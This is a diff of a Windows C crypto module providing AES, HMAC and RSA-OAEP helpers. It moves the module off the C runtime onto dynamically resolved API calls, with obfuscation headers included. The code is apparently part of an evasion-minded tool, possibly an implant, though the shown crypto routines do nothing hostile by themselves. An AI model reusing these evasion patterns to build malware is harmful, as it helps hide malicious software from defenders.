@@ -1,10 +1,10 @@
+#include <winsock2.h>
 #include <windows.h>
-#include <string.h>
-#include <stdlib.h>
 #include "crypto.h"
 #include "../../include/dynapi.h"
 #include "../../include/obf.h"
 #include "../../include/obf_strings.h"
+#include "../../include/mini_std.h"
 
 int gen_session_key(uint8_t key[32]) {
     NTSTATUS s = fnBCryptGenRandom(NULL, key, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
@@ -88,7 +88,7 @@ int aes_encrypt(const uint8_t *key, const uint8_t *plain, DWORD plain_len,
             iv_copy, 16, NULL, 0, &ct_len, BCRYPT_BLOCK_PADDING)))
         goto cleanup;
 
-    ct = (uint8_t *)malloc(ct_len);
+    ct = (uint8_t *)fnLocalAlloc(LPTR, ct_len);
     if (!ct) goto cleanup;
 
     /* 4. Encrypt */
@@ -117,7 +117,7 @@ int aes_encrypt(const uint8_t *key, const uint8_t *plain, DWORD plain_len,
     ret = 0;
 
 cleanup:
-    free(ct);
+    if (ct) fnLocalFree(ct);
     if (hHash) fnBCryptDestroyHash(hHash);
     if (hHmac) fnBCryptCloseAlgorithmProvider(hHmac, 0);
     if (hKey)  fnBCryptDestroyKey(hKey);
@@ -225,11 +225,11 @@ int rsa_encrypt_pubkey(const char *pem, const uint8_t *plain, DWORD plain_len,
     if (!fnCryptStringToBinaryA(pem, 0, CRYPT_STRING_BASE64HEADER,
                                NULL, &der_len, NULL, NULL))
         return -1;
-    uint8_t *der = (uint8_t *)malloc(der_len);
+    uint8_t *der = (uint8_t *)fnLocalAlloc(LPTR, der_len);
     if (!der) return -1;
     if (!fnCryptStringToBinaryA(pem, 0, CRYPT_STRING_BASE64HEADER,
                                der, &der_len, NULL, NULL)) {
-        free(der); return -1;
+        fnLocalFree(der); return -1;
     }
 
     /* 2. DER -> CERT_PUBLIC_KEY_INFO */
@@ -238,13 +238,13 @@ int rsa_encrypt_pubkey(const char *pem, const uint8_t *plain, DWORD plain_len,
     if (!fnCryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO,
                               der, der_len, CRYPT_DECODE_ALLOC_FLAG,
                               NULL, &pub_info, &pub_info_len)) {
-        free(der); return -1;
+        fnLocalFree(der); return -1;
     }
 
     /* 3. Import as BCrypt key */
     BCRYPT_KEY_HANDLE hKey = NULL;
     if (!fnCryptImportPublicKeyInfoEx2(X509_ASN_ENCODING, pub_info, 0, NULL, &hKey)) {
-        fnLocalFree(pub_info); free(der); return -1;
+        fnLocalFree(pub_info); fnLocalFree(der); return -1;
     }
 
     /* 4. RSA-OAEP-SHA256 encrypt */
@@ -259,6 +259,6 @@ int rsa_encrypt_pubkey(const char *pem, const uint8_t *plain, DWORD plain_len,
 
     fnBCryptDestroyKey(hKey);
     fnLocalFree(pub_info);
-    free(der);
+    fnLocalFree(der);
     return BCRYPT_SUCCESS(status) ? 0 : -1;
 }
